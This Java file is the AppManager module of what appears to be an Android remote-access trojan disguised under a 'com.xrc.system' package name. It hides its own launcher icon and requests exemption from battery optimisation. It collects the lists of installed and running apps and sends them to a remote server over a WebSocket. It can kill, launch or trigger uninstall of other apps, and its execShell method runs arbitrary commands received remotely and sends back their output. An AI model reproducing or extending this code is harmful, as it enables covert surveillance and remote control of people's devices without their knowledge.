package com.xrc.system.features;

import android.app.ActivityManager;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.os.Vibrator;
import android.provider.Settings;
import android.util.Log;
import android.widget.Toast;

import com.xrc.system.core.ConfigManager;
import com.xrc.system.core.Constants;
import com.xrc.system.network.WebSocketClient;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.util.List;

public class AppManager {
    private static final String TAG = Constants.TAG + ":App";
    private static AppManager instance;
    private final Context ctx;
    private final PackageManager pm;

    private AppManager(Context ctx) {
        this.ctx = ctx.getApplicationContext();
        this.pm = ctx.getPackageManager();
    }

    public static synchronized AppManager get(Context ctx) {
        if (instance == null) {
            instance = new AppManager(ctx);
        }
        return instance;
    }

    public void hideIcon() {
        try {
            pm.setComponentEnabledSetting(
                    new ComponentName(ctx, com.xrc.system.ui.MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                    PackageManager.DONT_KILL_APP);
            ConfigManager.get(ctx).setBoolean(Constants.PREF_ICON_HIDDEN, true);
            Log.i(TAG, "Icon hidden");
        } catch (Exception e) {
            Log.e(TAG, "Hide icon failed", e);
        }
    }

    public void showIcon() {
        try {
            pm.setComponentEnabledSetting(
                    new ComponentName(ctx, com.xrc.system.ui.MainActivity.class),
                    PackageManager.COMPONENT_ENABLED_STATE_ENABLED,
                    PackageManager.DONT_KILL_APP);
            ConfigManager.get(ctx).setBoolean(Constants.PREF_ICON_HIDDEN, false);
            Log.i(TAG, "Icon shown");
        } catch (Exception e) {
            Log.e(TAG, "Show icon failed", e);
        }
    }

    public void ensureIconHidden() {
        if (!ConfigManager.get(ctx).getBoolean(Constants.PREF_ICON_HIDDEN, false)) {
            hideIcon();
        }
    }

    public void whitelistBattery() {
        try {
            PowerManager pm = (PowerManager) ctx.getSystemService(Context.POWER_SERVICE);
            if (pm == null) return;
            String pkg = ctx.getPackageName();
            if (!pm.isIgnoringBatteryOptimizations(pkg)) {
                Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                intent.setData(Uri.parse("package:" + pkg));
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Battery whitelist failed", e);
        }
    }

    public void launchApp(String pkg) {
        try {
            Intent intent = pm.getLaunchIntentForPackage(pkg);
            if (intent != null) {
                intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                ctx.startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Launch failed", e);
        }
    }

    public void uninstallApp(String pkg) {
        try {
            Intent intent = new Intent(Intent.ACTION_DELETE);
            intent.setData(Uri.parse("package:" + pkg));
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ctx.startActivity(intent);
        } catch (Exception e) {
            Log.e(TAG, "Uninstall failed", e);
        }
    }

    public void killApp(String pkg) {
        try {
            ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) {
                am.killBackgroundProcesses(pkg);
            }
        } catch (Exception e) {
            Log.e(TAG, "Kill failed", e);
        }
    }

    public void listInstalled() {
        try {
            List<ApplicationInfo> apps = pm.getInstalledApplications(PackageManager.GET_META_DATA);
            JSONArray arr = new JSONArray();
            for (ApplicationInfo app : apps) {
                JSONObject obj = new JSONObject();
                obj.put("pkg", app.packageName);
                obj.put("name", pm.getApplicationLabel(app).toString());
                obj.put("system", (app.flags & ApplicationInfo.FLAG_SYSTEM) != 0);
                arr.put(obj);
            }
            JSONObject data = new JSONObject();
            data.put("apps", arr);
            data.put("count", arr.length());
            WebSocketClient.get(ctx).sendEvent("app_list", data);
        } catch (JSONException e) {
            Log.e(TAG, "App list failed", e);
        }
    }

    public void listRunning() {
        try {
            ActivityManager am = (ActivityManager) ctx.getSystemService(Context.ACTIVITY_SERVICE);
            if (am == null) return;
            List<ActivityManager.RunningAppProcessInfo> procs = am.getRunningAppProcesses();
            JSONArray arr = new JSONArray();
            if (procs != null) {
                for (ActivityManager.RunningAppProcessInfo proc : procs) {
                    JSONObject obj = new JSONObject();
                    obj.put("pid", proc.pid);
                    obj.put("pkg", proc.processName);
                    obj.put("importance", proc.importance);
                    arr.put(obj);
                }
            }
            JSONObject data = new JSONObject();
            data.put("processes", arr);
            WebSocketClient.get(ctx).sendEvent("running_apps", data);
        } catch (JSONException e) {
            Log.e(TAG, "Running list failed", e);
        }
    }

    public void setVolume(int level) {
        android.media.AudioManager am = (android.media.AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
        if (am == null) return;
        int max = am.getStreamMaxVolume(android.media.AudioManager.STREAM_MUSIC);
        am.setStreamVolume(android.media.AudioManager.STREAM_MUSIC, (max * level) / 100, 0);
    }

    public void mute() {
        android.media.AudioManager am = (android.media.AudioManager) ctx.getSystemService(Context.AUDIO_SERVICE);
        if (am == null) return;
        am.setStreamMute(android.media.AudioManager.STREAM_MUSIC, true);
        am.setStreamMute(android.media.AudioManager.STREAM_RING, true);
        am.setStreamMute(android.media.AudioManager.STREAM_NOTIFICATION, true);
    }

    public void vibrate(int ms) {
        Vibrator v = (Vibrator) ctx.getSystemService(Context.VIBRATOR_SERVICE);
        if (v != null && v.hasVibrator()) {
            v.vibrate(ms);
        }
    }

    public void showToast(String msg) {
        Toast.makeText(ctx, msg, Toast.LENGTH_LONG).show();
    }

    public void execShell(String cmd) {
        try {
            Process p = Runtime.getRuntime().exec(cmd);
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                sb.append(line).append("\n");
            }
            reader.close();
            p.waitFor();
            JSONObject data = new JSONObject();
            data.put("cmd", cmd);
            data.put("output", sb.toString());
            data.put("exit", p.exitValue());
            WebSocketClient.get(ctx).sendEvent("shell_output", data);
        } catch (Exception e) {
            Log.e(TAG, "Shell exec failed", e);
        }
    }
}
